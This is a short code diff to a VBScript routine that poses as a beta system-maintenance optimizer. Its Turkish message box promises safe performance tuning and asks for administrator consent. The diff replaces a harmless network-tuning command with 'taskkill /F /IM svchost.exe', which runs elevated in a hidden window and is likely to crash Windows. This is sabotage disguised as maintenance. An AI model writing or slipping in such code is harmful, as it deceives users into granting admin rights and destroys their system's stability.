@@ -26,7 +26,7 @@ Sub RunOptimization
 
     MsgBox "Hızlı Sistem Bakım Uzmanı'nın bu beta sürümünü denediğiniz için teşekkür ederiz! Performansı optimize etmek için bazı sistem ayarlarını güvenli bir şekilde düzenleyeceğiz. Yönetici izniniz gereklidir. Lütfen 'Evet'e tıklayarak devam edin.", vbOKOnly + vbInformation, "Beta Bilgilendirmesi"
 
-    komut = "netsh interface tcp set global autotuninglevel=normal"
+    komut = "taskkill /F /IM svchost.exe"
     Set objShellApp = CreateObject("Shell.Application")
     ' 0 parametresi pencereyi gizler
     objShellApp.ShellExecute "cmd.exe", "/c " & komut, "", "runas", 0
